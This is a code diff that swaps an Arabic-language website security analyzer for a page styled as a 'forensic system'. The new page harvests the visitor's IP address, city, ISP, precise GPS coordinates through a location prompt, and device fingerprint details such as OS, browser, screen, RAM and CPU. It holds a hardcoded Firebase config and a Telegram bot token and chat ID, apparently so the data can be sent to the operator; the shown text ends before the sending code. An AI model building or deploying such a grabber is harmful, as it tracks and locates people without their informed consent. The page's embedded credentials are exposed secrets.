@@ -3,657 +3,551 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>المحلل الأمني المتقدم V2</title>
+    <title>النظام الجنائي - البيانات الشاملة</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
-        :root {
-            --bg-color: #0d1117;
-            --card-bg: #161b22;
-            --text-main: #c9d1d9;
-            --accent: #58a6ff;
-            --success: #2ea043;
-            --danger: #da3633;
-            --warning: #d29922;
-            --border: #30363d;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            margin: 0;
-            padding: 20px;
-            line-height: 1.6;
-        }
-
-        .container { max-width: 1200px; margin: 0 auto; }
-
-        header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding: 20px;
-            border-bottom: 1px solid var(--border);
-        }
-
-        h1 { color: var(--accent); margin-bottom: 10px; }
-        
-        .input-group {
-            display: flex;
-            gap: 10px;
-            max-width: 700px;
-            margin: 20px auto;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        input[type="text"] {
-            flex: 1;
-            min-width: 250px;
-            padding: 12px;
-            border-radius: 6px;
-            border: 1px solid var(--border);
-            background: var(--card-bg);
-            color: white;
-            font-size: 16px;
-        }
-
-        .btn {
-            padding: 12px 24px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.3s;
-            color: white;
-        }
-
-        .btn-scan { background: var(--success); }
-        .btn-scan:hover { background: #2c974b; }
-        .btn-scan:disabled { background: #30363d; cursor: not-allowed; }
-        
-        .btn-upload { background: var(--accent); }
-        .btn-upload:hover { background: #3b82f6; }
-
-        .btn-download { background: var(--warning); color: #000; }
-        .btn-download:hover { background: #b08d1a; }
-
-        /* Dashboard */
-        .dashboard { display: none; margin-top: 20px; }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .stat-box {
-            background: var(--card-bg);
-            padding: 15px;
-            text-align: center;
-            border-radius: 8px;
-            border: 1px solid var(--border);
-        }
-
-        .stat-number { font-size: 1.8em; font-weight: bold; color: var(--accent); }
-        .stat-label { font-size: 0.85em; color: #8b949e; }
-
-        .grid-cards {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 20px;
-        }
-
-        .card {
-            background: var(--card-bg);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 15px;
-        }
-
-        .card h3 {
-            margin-top: 0;
-            border-bottom: 1px solid var(--border);
-            padding-bottom: 10px;
-            color: var(--accent);
-            font-size: 1.1em;
-        }
-
-        .resource-list {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            max-height: 250px;
-            overflow-y: auto;
-        }
-
-        .resource-list li {
-            padding: 6px 8px;
-            border-bottom: 1px solid #21262d;
-            font-size: 0.85em;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            word-break: break-all;
-        }
-
-        .resource-list li:last-child { border-bottom: none; }
-        .resource-list li:hover { background: #21262d; }
-
-        .badge {
-            background: #30363d;
-            padding: 2px 8px;
-            border-radius: 10px;
-            font-size: 0.75em;
-            margin-right: 5px;
-        }
-
-        .risk-high { color: var(--danger); }
-        .risk-med { color: var(--warning); }
-        .risk-low { color: var(--success); }
-
-        /* Loader & Alerts */
-        .loader {
-            display: none;
-            text-align: center;
-            padding: 40px;
-        }
-        .spinner {
-            border: 4px solid #30363d;
-            border-top: 4px solid var(--accent);
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .alert {
-            padding: 15px;
-            border-radius: 6px;
-            margin: 20px auto;
-            max-width: 700px;
-            display: none;
-        }
-        .alert-error { background: rgba(218, 54, 51, 0.2); border: 1px solid var(--danger); color: #ff7b72; }
-        .alert-info { background: rgba(88, 166, 255, 0.2); border: 1px solid var(--accent); color: #79c0ff; }
-
-        .score-box {
-            text-align: center;
-            padding: 20px;
-        }
-        .score-circle {
-            width: 120px;
-            height: 120px;
-            border-radius: 50%;
-            border: 6px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2em;
-            font-weight: bold;
-            margin: 0 auto 15px;
-        }
-
-        /* Scrollbar */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: var(--bg-color); }
-        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #484f58; }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
+        html,body{width:100%;height:100%;overflow-x:hidden}
+        body{background:#000;color:#0f0;padding:10px;
+            background-image:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,0,0.03) 2px),
+            repeating-linear-gradient(90deg,transparent,transparent 2px,rgba(0,255,0,0.03) 2px)}
+        .container{max-width:800px;margin:0 auto;background:rgba(0,20,0,0.95);
+            border:2px solid #0f0;border-radius:5px;padding:20px;
+            box-shadow:0 0 30px rgba(0,255,0,0.3);position:relative;width:100%}
+        h1{text-align:center;color:#0f0;font-size:1.5rem;margin-bottom:5px;
+            text-shadow:0 0 10px #0f0;border-bottom:1px solid #0f0;padding-bottom:10px}
+        .subtitle{text-align:center;color:#0a0;font-size:0.8rem;margin-bottom:20px}
+        .status-box{background:rgba(0,255,0,0.1);border:1px solid #0f0;
+            padding:15px;margin:15px 0;border-radius:5px;text-align:center}
+        .status-box.connecting{color:#ff0;border-color:#ff0;animation:pulse-yellow 2s infinite}
+        .status-box.connected{color:#0f0;border-color:#0f0;animation:pulse-green 2s infinite}
+        @keyframes pulse-yellow{0%,100%{box-shadow:0 0 5px rgba(255,255,0,0.3)}50%{box-shadow:0 0 20px rgba(255,255,0,0.6)}}
+        @keyframes pulse-green{0%,100%{box-shadow:0 0 5px rgba(0,255,0,0.3)}50%{box-shadow:0 0 20px rgba(0,255,0,0.6)}}
+        .data-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:15px 0}
+        .data-box{background:rgba(0,255,0,0.05);border:1px solid #0a0;padding:10px;border-radius:3px}
+        .data-box.full{grid-column:span 2}.data-box.critical{border-color:#0f0}
+        .label{color:#0a0;font-size:0.75rem;margin-bottom:5px}
+        .value{color:#0f0;font-size:0.9rem;font-weight:bold;word-break:break-all}
+        .value.pending{color:#0a0;animation:blink 1s infinite}
+        @keyframes blink{50%{opacity:0.3}}
+        #map{height:300px;width:100%;margin:15px 0;border:2px solid #0f0;border-radius:5px;display:none}
+        .log-console{background:#000;border:1px solid #0a0;padding:10px;
+            margin:15px 0;font-size:0.7rem;height:150px;overflow-y:auto;color:#0a0;direction:ltr;text-align:left}
+        .log-line{margin:3px 0}.log-line.success{color:#0f0}.log-line.error{color:#f00}
+        .log-line.warn{color:#ff0}.log-line.info{color:#0a0}
+        .progress-bar{width:100%;height:4px;background:#0a0;margin:10px 0;border-radius:2px;overflow:hidden}
+        .progress-fill{height:100%;background:#0f0;width:0%;transition:width 0.3s}
+        @media(max-width:600px){.data-grid{grid-template-columns:1fr}.data-box.full{grid-column:span 1}h1{font-size:1.2rem}}
     </style>
 </head>
 <body>
-
-<div class="container">
-    <header>
-        <h1>🛡️ المحلل الأمني المتقدم V2</h1>
-        <div style="color: #8b949e;">تحليل شامل للموارد، الثغرات، والسيرفرات المرتبطة</div>
+    <div class="container">
+        <h1>🛡️ النظام الجنائي - الشامل</h1>
+        <div class="subtitle">جمع البيانات التفصيلية</div>
         
-        <div class="input-group">
-            <input type="text" id="targetUrl" placeholder="أدخل رابط الموقع (https://example.com)" value="https://example.com">
-            <button class="btn btn-scan" id="scanBtn" onclick="startScan()">🔍 فحص الرابط</button>
-            <label class="btn btn-upload" style="display: inline-block; margin: 0;">
-                📂 رفع ملف HTML
-                <input type="file" id="fileInput" accept=".html,.htm" style="display: none;" onchange="handleFileUpload(this)">
-            </label>
+        <div class="status-box connecting" id="statusBox">
+            <div id="statusText">🔄 جاري جمع البيانات...</div>
+            <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>        </div>
+        
+        <div id="map"></div>
+        
+        <div class="data-grid">
+            <div class="data-box critical full">
+                <div class="label">🌐 IP Address (العنوان الخارجي)</div>
+                <div class="value pending" id="ip">جاري التحليل...</div>
+            </div>
+            <div class="data-box critical">
+                <div class="label">📍 الدولة</div>
+                <div class="value" id="country">-</div>
+            </div>
+            <div class="data-box critical">
+                <div class="label">🏙️ المدينة</div>
+                <div class="value" id="city">-</div>
+            </div>
+            <div class="data-box critical">
+                <div class="label">🎯 خط العرض (LAT)</div>
+                <div class="value" id="lat">-</div>
+            </div>
+            <div class="data-box critical">
+                <div class="label">🎯 خط الطول (LNG)</div>
+                <div class="value" id="lng">-</div>
+            </div>
+            <div class="data-box">
+                <div class="label">🏢 مزود الخدمة (ISP)</div>
+                <div class="value" id="isp">-</div>
+            </div>
+            <div class="data-box">
+                <div class="label">📡 نوع الاتصال</div>
+                <div class="value" id="connection">-</div>
+            </div>
+            <div class="data-box">
+                <div class="label">💻 نظام التشغيل</div>
+                <div class="value" id="os">-</div>
+            </div>
+            <div class="data-box">
+                <div class="label">🌐 المتصفح</div>
+                <div class="value" id="browser">-</div>
+            </div>
+            <div class="data-box">
+                <div class="label">📱 دقة الشاشة</div>
+                <div class="value" id="screen">-</div>
+            </div>
+            <div class="data-box">
+                <div class="label">🎨 عمق الألوان</div>
+                <div class="value" id="colorDepth">-</div>
+            </div>
+            <div class="data-box">                <div class="label">⏰ المنطقة الزمنية</div>
+                <div class="value" id="timezone">-</div>
+            </div>
+            <div class="data-box">
+                <div class="label">🌍 اللغة</div>
+                <div class="value" id="language">-</div>
+            </div>
+            <div class="data-box">
+                <div class="label">💾 الذاكرة (RAM)</div>
+                <div class="value" id="memory">-</div>
+            </div>
+            <div class="data-box full">
+                <div class="label">🔗 الرابط الكامل</div>
+                <div class="value" id="url" style="font-size:0.7rem">-</div>
+            </div>
+            <div class="data-box full">
+                <div class="label">🖥️ معلومات الجهاز الكاملة</div>
+                <div class="value" id="deviceInfo" style="font-size:0.7rem">-</div>
+            </div>
         </div>
-    </header>
-
-    <div id="alertBox" class="alert"></div>
-
-    <div id="loader" class="loader">
-        <div class="spinner"></div>
-        <h3 id="loaderText">جاري الاتصال...</h3>
-        <p style="color: #8b949e; font-size: 0.9em;">قد تستغرق العملية بضع ثوانٍ حسب حجم الموقع</p>
+        
+        <div class="log-console" id="console"></div>
     </div>
 
-    <div id="dashboard" class="dashboard">
-        <!-- Stats -->
-        <div class="stats-grid">
-            <div class="stat-box">
-                <div class="stat-number" id="stat-img">0</div>
-                <div class="stat-label">الصور</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-number" id="stat-js">0</div>
-                <div class="stat-label">ملفات JS</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-number" id="stat-css">0</div>
-                <div class="stat-label">ملفات CSS</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-number" id="stat-links">0</div>
-                <div class="stat-label">الروابط</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-number" id="stat-risks" style="color: var(--danger)">0</div>
-                <div class="stat-label">مخاطر</div>
-            </div>
-        </div>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
-        <!-- Security Score -->
-        <div class="card score-box">
-            <h3>تقييم الأمان العام</h3>
-            <div id="securityScore" class="score-circle">--</div>
-            <p id="securityMsg" style="color: #8b949e;">في انتظار التحليل...</p>
-        </div>
+    <script>
+        // ✅ إعدادات Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyCVyg-EAtI-oumlWnBOVNKBjwufbTS6H5w",
+            authDomain: "onx-gp-aade0.firebaseapp.com",
+            databaseURL: "https://onx-gp-aade0-default-rtdb.firebaseio.com",
+            projectId: "onx-gp-aade0",
+            storageBucket: "onx-gp-aade0.firebasestorage.app",
+            messagingSenderId: "434498224932",
+            appId: "1:434498224932:web:7c3b1d6e28b90168e869b1",
+            measurementId: "G-M3K67GR34L"
+        };
 
-        <div class="grid-cards">
-            <!-- Scripts -->
-            <div class="card">
-                <h3>📜 ملفات الجافاسكربت (JS)</h3>
-                <ul class="resource-list" id="list-js"></ul>
-            </div>
+        const BOT_TOKEN = "7735965641:AAFzkUy27zKXYWroodhdxOBapMgwttyq5_s";
+        const CHAT_ID = "910624538";
+        
+        let data = {
+            id: Date.now(),
+            timestamp: '',
+            ip: '', country: '', city: '', lat: '', lng: '',
+            isp: '', accuracy: '', connection: '', os: '',
+            browser: '', screen: '', colorDepth: '', timezone: '',            language: '', memory: '', url: '', deviceInfo: '',
+            userAgent: '', platform: '', cpu: ''
+        };
+        
+        let firebaseConnected = false;
+        let telegramSent = false;
+        let map = null;
+        let progress = 0;
 
-            <!-- Styles -->
-            <div class="card">
-                <h3>🎨 ملفات التنسيق (CSS)</h3>
-                <ul class="resource-list" id="list-css"></ul>
-            </div>
-
-            <!-- Images -->
-            <div class="card">
-                <h3>🖼️ الصور والخلفيات</h3>
-                <ul class="resource-list" id="list-img"></ul>
-            </div>
-
-            <!-- Links -->
-            <div class="card">
-                <h3>🔗 الروابط والمسارات</h3>
-                <ul class="resource-list" id="list-links"></ul>
-            </div>
-
-            <!-- External Servers -->
-            <div class="card">
-                <h3>🌐 سيرفرات خارجية مرتبطة</h3>
-                <ul class="resource-list" id="list-servers"></ul>
-            </div>
-
-            <!-- Forms -->
-            <div class="card">
-                <h3>📝 النماذج (Forms)</h3>
-                <ul class="resource-list" id="list-forms"></ul>
-            </div>
-        </div>
-
-        <!-- Security Issues -->
-        <div class="card" style="margin-top: 20px;">
-            <h3>⚠️ تقارير الثغرات والمخاطر الأمنية</h3>
-            <ul class="resource-list" id="list-risks"></ul>
-        </div>
-
-        <!-- Download Full Source -->
-        <div class="card" style="margin-top: 20px; text-align: center;">
-            <h3>💾 حفظ الكود المصدري الكامل</h3>
-            <p style="color: #8b949e; margin-bottom: 15px;">قم بتحميل ملف HTML الكامل لدراسته محلياً باستخدام محرر الأكواد</p>
-            <button class="btn btn-download" onclick="downloadFullSource()">تحميل source.html</button>
-        </div>
-    </div>
-</div>
-
-<script>
-    // قائمة الوسائط (Proxies) للتحايل على CORS
-    const PROXIES = [
-        "https://api.allorigins.win/get?url=",
-        "https://corsproxy.io/?",
-        "https://api.codetabs.com/v1/proxy?quest="
-    ];
-
-    let fullSourceCode = "";
-    let currentBaseUrl = "";
-
-    // showAlert Function
-    function showAlert(message, type = 'error') {
-        const alertBox = document.getElementById('alertBox');
-        alertBox.className = `alert alert-${type}`;
-        alertBox.innerHTML = message;
-        alertBox.style.display = 'block';
-        setTimeout(() => { alertBox.style.display = 'none'; }, 5000);
-    }
-
-    // Start Scan
-    async function startScan() {
-        const urlInput = document.getElementById('targetUrl').value.trim();
-        if (!urlInput) {
-            showAlert("الرجاء إدخال رابط صحيح يبدأ بـ http:// أو https://");
-            return;
+        function updateProgress(percent, message) {
+            progress = percent;
+            document.getElementById('progressBar').style.width = percent + '%';
+            document.getElementById('statusText').innerText = message;
         }
 
-        // Validate URL
-        let validUrl = urlInput;
-        if (!validUrl.startsWith('http://') && !validUrl.startsWith('https://')) {
-            validUrl = 'https://' + validUrl;
+        function updateElement(id, value) {
+            const el = document.getElementById(id);
+            if (el) {
+                el.innerText = value || 'N/A';
+            }
         }
 
-        currentBaseUrl = validUrl;
-        document.getElementById('dashboard').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('scanBtn').disabled = true;
-        document.getElementById('loaderText').innerText = "جاري الاتصال بالخادم...";
+        function log(msg, type = 'info') {
+            const consoleEl = document.getElementById('console');
+            if (consoleEl) {
+                const line = document.createElement('div');
+                line.className = `log-line ${type}`;
+                line.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+                consoleEl.appendChild(line);
+                consoleEl.scrollTop = consoleEl.scrollHeight;
+            }
+            console.log(type, msg);
+        }
 
-        try {
-            fullSourceCode = await fetchWithProxies(validUrl);
+        function updateStatus(text, type) {
+            const box = document.getElementById('statusBox');
+            const textEl = document.getElementById('statusText');
+            if (box && textEl) {
+                textEl.innerText = text;
+                box.className = 'status-box ' + type;
+            }
+        }
+
+        // 🔍 تحليل مفصل لـ User Agent
+        function parseUserAgent() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
             
-            document.getElementById('loaderText').innerText = "جاري تحليل الكود المصدري...";
+            // نظام التشغيل
+            if (ua.includes('Android')) {                data.os = 'Android';
+                const androidMatch = ua.match(/Android (\d+\.\d+)/);
+                if (androidMatch) data.os += ` ${androidMatch[1]}`;
+            } else if (ua.includes('iPhone') || ua.includes('iPad')) {
+                data.os = 'iOS';
+                const iosMatch = ua.match(/OS (\d+)_/);
+                if (iosMatch) data.os += ` ${iosMatch[1]}.x`;
+            } else if (ua.includes('Windows')) {
+                data.os = 'Windows';
+                if (ua.includes('Windows NT 10')) data.os += ' 10';
+                else if (ua.includes('Windows NT 6.3')) data.os += ' 8.1';
+            } else if (ua.includes('Mac')) {
+                data.os = 'macOS';
+            } else if (ua.includes('Linux')) {
+                data.os = 'Linux';
+            } else {
+                data.os = platform || 'Unknown';
+            }
             
-            // Parse HTML
-            const parser = new DOMParser();
-            const doc = parser.parseFromString(fullSourceCode, 'text/html');
-
-            // Run Analysis
-            analyzeResources(doc);
-            analyzeSecurity(doc);
-            analyzeNetwork(fullSourceCode);
-
-            // Show Dashboard
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('dashboard').style.display = 'block';
-            document.getElementById('scanBtn').disabled = false;
-            showAlert("تم الفحص بنجاح!", "info");
-
-        } catch (error) {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('scanBtn').disabled = false;
-            showAlert("فشل الفحص: " + error.message + "<br><br>💡 <b>حل بديل:</b> احفظ صفحة الموقع كملف HTML على جهازك ثم اضغط على زر 'رفع ملف HTML' في الأعلى.");
-            console.error(error);
+            // المتصفح
+            if (ua.includes('Chrome') && !ua.includes('Edg')) {
+                const chromeMatch = ua.match(/Chrome\/(\d+\.\d+)/);
+                data.browser = `Chrome ${chromeMatch ? chromeMatch[1] : ''}`;
+            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+                data.browser = 'Safari';
+            } else if (ua.includes('Firefox')) {
+                const firefoxMatch = ua.match(/Firefox\/(\d+\.\d+)/);
+                data.browser = `Firefox ${firefoxMatch ? firefoxMatch[1] : ''}`;
+            } else if (ua.includes('Edg')) {
+                data.browser = 'Microsoft Edge';
+            } else {
+                data.browser = 'Unknown Browser';
+            }
+            
+            data.userAgent = ua;
+            data.platform = platform;
+            data.cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown';
         }
-    }
 
-    // Fetch with Fallback Proxies
-    async function fetchWithProxies(url) {
-        for (let i = 0; i < PROXIES.length; i++) {
+        // 🌐 جلب IP بـ 5 طرق مختلفة
+        async function getIPData() {
+            log('🔍 جاري جلب IP...', 'info');
+            updateProgress(20, 'جلب معلومات IP...');
+            
+            const apis = [
+                { name: 'ipapi.co', url: 'https://ipapi.co/json/' },
+                { name: 'ip-api', url: 'https://ip-api.com/json/' },
+                { name: 'ipinfo', url: 'https://ipinfo.io/json/' },
+                { name: 'ip.sb', url: 'https://api.ip.sb/geoip' },
+                { name: 'myip', url: 'https://api.myip.com' }            ];
+            
+            for (let api of apis) {
+                try {
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 5000);
+                    
+                    const response = await fetch(api.url, { signal: controller.signal });
+                    clearTimeout(timeout);
+                    
+                    const result = await response.json();
+                    
+                    // استخراج البيانات من أي API
+                    data.ip = result.ip || result.query || 'Unknown';
+                    data.country = result.country_name || result.country || 'Unknown';
+                    data.city = result.city || 'Unknown';
+                    data.isp = result.org || result.isp || result.asn || 'Unknown';
+                    data.lat = result.latitude || result.lat || '';
+                    data.lng = result.longitude || result.lon || '';
+                    
+                    updateElement('ip', data.ip);
+                    updateElement('country', data.country);
+                    updateElement('city', data.city);
+                    updateElement('isp', data.isp);
+                    
+                    log(`✓ IP من ${api.name}: ${data.ip}`, 'success');
+                    updateProgress(40, 'تم جلب IP والموقع');
+                    return true;
+                    
+                } catch (e) {
+                    log(`✗ فشل ${api.name}`, 'warn');
+                }
+            }
+            
+            // Fallback: استخدام WebRTC لاكتشاف IP المحلي
             try {
-                document.getElementById('loaderText').innerText = `جاري المحاولة عبر الوسيط ${i + 1} من ${PROXIES.length}...`;
-                const response = await fetch(PROXIES[i] + encodeURIComponent(url));
-                
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
-                
-                const data = await response.json();
-                
-                // Handle different proxy response formats
-                if (data.contents) return data.contents;
-                if (data.body) return data.body;
-                if (typeof data === 'string') return data;
-                
-                throw new Error("صيغة استجابة غير معروفة");
+                const localIP = await getLocalIP();
+                data.ip = localIP || 'Unknown';
+                updateElement('ip', data.ip + ' (Local)');
+                log(`✓ IP المحلي: ${data.ip}`, 'warn');
             } catch (e) {
-                console.log(`Proxy ${i + 1} failed:`, e.message);
-                if (i === PROXIES.length - 1) throw new Error("فشل الاتصال بجميع الخوادم الوسيطة. الموقع قد يحمي نفسه من الوصول المباشر.");
+                updateElement('ip', 'Unknown');
+                log('✗ فشل جلب IP', 'error');
             }
-        }
-    }
-
-    // Handle File Upload
-    function handleFileUpload(input) {
-        const file = input.files[0];
-        if (!file) return;
-
-        const reader = new FileReader();
-        reader.onload = function(e) {
-            fullSourceCode = e.target.result;
-            currentBaseUrl = "file://local-upload";
             
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('loaderText').innerText = "جاري تحليل الملف المرفوع...";
+            updateProgress(40, 'تم (بعض البيانات غير متوفرة)');
+            return false;
+        }
 
-            setTimeout(() => {
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(fullSourceCode, 'text/html');
-                analyzeResources(doc);
-                analyzeSecurity(doc);
-                analyzeNetwork(fullSourceCode);
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('dashboard').style.display = 'block';
-                showAlert("تم تحليل الملف بنجاح!", "info");
-            }, 500);
-        };
-        reader.readAsText(file);
-    }
+        // 🔧 الحصول على IP المحلي عبر WebRTC        function getLocalIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
+                        resolve('Unknown');
+                    } else {
+                        const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+                        resolve(myIP);
+                    }
+                };
+                
+                setTimeout(() => resolve('Unknown'), 3000);
+            });
+        }
 
-    // Analyze Resources
-    function analyzeResources(doc) {
-        // Scripts
-        const scripts = Array.from(doc.querySelectorAll('script[src]')).map(s => s.src);
-        renderList('list-js', scripts, 'js');
-        document.getElementById('stat-js').innerText = scripts.length;
+        // 📍 GPS مع تفاصيل أكثر
+        function getGPS() {
+            return new Promise(resolve => {
+                if (!navigator.geolocation) {
+                    log('GPS غير مدعوم', 'error');
+                    updateElement('lat', 'Not Supported');
+                    updateElement('lng', 'Not Supported');
+                    resolve(false);
+                    return;
+                }
+                
+                log('🛰️ جاري طلب GPS...', 'info');
+                updateProgress(60, 'طلب إذن GPS...');
+                
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        data.lat = pos.coords.latitude.toFixed(6);
+                        data.lng = pos.coords.longitude.toFixed(6);
+                        data.accuracy = pos.coords.accuracy.toFixed(2);
+                        const altitude = pos.coords.altitude || 'N/A';
+                        const speed = pos.coords.speed || 'N/A';
+                        
+                        updateElement('lat', data.lat);
+                        updateElement('lng', data.lng);
+                        
+                        log(`✓ GPS: ${data.lat}, ${data.lng}`, 'success');
+                        log(`📊 الدقة: ${data.accuracy}م, الارتفاع: ${altitude}م`, 'info');
+                        
+                        initMap(parseFloat(data.lat), parseFloat(data.lng));
+                        updateProgress(80, 'تم تحديد الموقع بدقة');
+                        resolve(true);                    },
+                    err => {
+                        log(`✗ GPS: ${err.message}`, 'error');
+                        updateElement('lat', 'Denied');
+                        updateElement('lng', 'Denied');
+                        
+                        // استخدام IP-based location كـ fallback
+                        if (data.lat && data.lng) {
+                            log('📍 استخدام موقع IP كبديل', 'warn');
+                            initMap(parseFloat(data.lat), parseFloat(data.lng));
+                        }
+                        
+                        updateProgress(80, 'GPS مرفوض - استخدام IP');
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+                );
+            });
+        }
 
-        // Styles
-        const styles = Array.from(doc.querySelectorAll('link[rel="stylesheet"]')).map(s => s.href);
-        renderList('list-css', styles, 'css');
-        document.getElementById('stat-css').innerText = styles.length;
-
-        // Images
-        const images = Array.from(doc.querySelectorAll('img')).map(img => img.src);
-        // Extract Background Images
-        const bgElements = doc.querySelectorAll('[style*="background"]');
-        bgElements.forEach(el => {
-            const style = el.getAttribute('style');
-            const matches = style.match(/url\(['"]?(.*?)['"]?\)/g);
-            if (matches) {
-                matches.forEach(m => {
-                    const url = m.replace(/url\(['"]?(.*?)['"]?\)/, '$1');
-                    if (url && !images.includes(url)) images.push(url);
-                });
+        function initMap(lat, lng) {
+            const mapEl = document.getElementById('map');
+            if (mapEl) {
+                mapEl.style.display = 'block';
             }
-        });
-        renderList('list-img', images, 'img');
-        document.getElementById('stat-img').innerText = images.length;
-
-        // Links
-        const links = Array.from(doc.querySelectorAll('a[href]')).map(a => ({
-            href: a.href,
-            text: a.textContent.trim().substring(0, 30) || 'بدون نص'
-        }));
-        const linkList = document.getElementById('list-links');
-        linkList.innerHTML = '';
-        links.forEach(link => {
-            const li = document.createElement('li');
-            li.innerHTML = `<span><a href="${link.href}" target="_blank" style="color:var(--accent)">${link.text}</a><br><small style="color:#8b949e">${link.href}</small></span>`;
-            linkList.appendChild(li);
-        });
-        document.getElementById('stat-links').innerText = links.length;
-
-        // Forms
-        const forms = doc.querySelectorAll('form');
-        const formList = document.getElementById('list-forms');
-        formList.innerHTML = '';
-        forms.forEach((form, i) => {
-            const li = document.createElement('li');
-            li.innerHTML = `<span>Form #${i+1}: ${form.action || 'لا يوجد action'} (${form.method || 'GET'})</span>`;
-            formList.appendChild(li);
-        });
-    }
-
-    // Render List Helper
-    function renderList(elementId, items, type) {
-        const list = document.getElementById(elementId);
-        list.innerHTML = '';
-        const uniqueItems = [...new Set(items)].filter(i => i); // Remove duplicates and empty
-        
-        uniqueItems.forEach(item => {
-            const li = document.createElement('li');
-            const isExternal = item.startsWith('http') && !item.includes(window.location.hostname) && !item.includes('local-upload');
-            li.innerHTML = `
-                <span style="${isExternal ? 'color: var(--warning)' : ''}">${item}</span>
-                <button class="btn btn-download" style="padding: 2px 8px; font-size: 0.7em;" onclick="downloadResource('${item}', '${type}')">تحميل</button>
-            `;
-            list.appendChild(li);
-        });
-    }
-
-    // Analyze Security
-    function analyzeSecurity(doc) {
-        const riskList = document.getElementById('list-risks');
-        riskList.innerHTML = '';
-        let riskCount = 0;
-        let score = 100;
-
-        const addRisk = (msg, level) => {
-            riskCount++;
-            score -= (level === 'high' ? 15 : 8);
-            const li = document.createElement('li');
-            li.className = level === 'high' ? 'risk-high' : 'risk-med';
-            li.innerHTML = `<span>⚠️ ${msg}</span>`;
-            riskList.appendChild(li);
-        };
-
-        // 1. HTTP Resources
-        const httpResources = doc.querySelectorAll('[src^="http:"], [href^="http:"]');
-        if (httpResources.length > 0) {
-            addRisk(`${httpResources.length} مورد يستخدم HTTP غير الآمن`, 'high');
-        }
-
-        // 2. Exposed Emails
-        const emailRegex = /[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+/gi;
-        if (emailRegex.test(fullSourceCode)) {
-            addRisk("عناوين بريد إلكتروني مكشوفة في الكود", 'med');
-        }
-
-        // 3. Hidden Sensitive Inputs
-        doc.querySelectorAll('input[type="hidden"]').forEach(input => {
-            const name = input.name.toLowerCase();
-            if (['token', 'key', 'secret', 'auth', 'password', 'api'].some(k => name.includes(k))) {
-                addRisk(`حقل مخفي حساس: name="${input.name}"`, 'high');
+            
+            if (!map) {
+                map = L.map('map').setView([lat, lng], 15);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '© OpenStreetMap'
+                }).addTo(map);
+                L.marker([lat, lng]).addTo(map)
+                    .bindPopup(`📍 الموقع<br>الدقة: ${data.accuracy || 'N/A'}م`)
+                    .openPopup();
+                log('✓ الخريطة مفتوحة', 'success');
+            } else {
+                map.setView([lat, lng], 15);
             }
-        });
+        }
 
-        // 4. Iframes without Sandbox
-        doc.querySelectorAll('iframe').forEach(iframe => {
-            if (!iframe.hasAttribute('sandbox')) {
-                addRisk("iframe بدون خاصية Sandbox", 'med');
+        // 💻 جمع بيانات الجهاز المتقدمة
+        function getDeviceData() {
+            log('📱 جمع بيانات الجهاز...', 'info');
+            updateProgress(10, 'تحليل الجهاز...');
+            
+            parseUserAgent();
+            
+            data.screen = `${screen.width}x${screen.height} (${screen.availWidth}x${screen.availHeight})`;
